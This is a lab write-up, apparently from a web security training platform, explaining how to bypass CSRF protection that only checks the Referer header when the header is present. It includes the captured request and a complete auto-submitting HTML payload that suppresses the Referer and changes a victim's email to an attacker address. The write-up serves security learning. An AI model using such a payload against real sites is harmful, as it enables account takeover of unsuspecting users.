CSRF - Referer Header Validation: Bypass by Removing the Header

Category: CSRF
Difficulty: Practitioner

### Overview / What I Learned
Some websites rely on the Referer header for CSRF protection.
If the Referer header is missing, the server may incorrectly assume the request is legitimate.
We can exploit this logic by ensuring the Referer header is not sent in a cross-site request.

###Exploit Steps / Attack Methodology
1. Recon and Analysis
Logged in as wiener:peter using Burp's browser.

Navigated to the “Change Email” functionality.

Captured the POST request to /my-account/change-email:

POST /my-account/change-email HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
...
Referer: https://<LAB-ID>.web-security-academy.net/my-account
Tested two behaviors using Burp Repeater:

 Referer present and matches → Request accepted

 Referer changed to malicious domain → Request rejected

 Referer header removed → Request accepted

2. Crafting the Exploit
Included a <meta name="referrer" content="no-referrer"> tag to suppress the Referer header.

3. Final Payload
<!DOCTYPE html>
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body>
  <form action="https://<LAB-ID>.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <input type="submit" value="Click me">
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
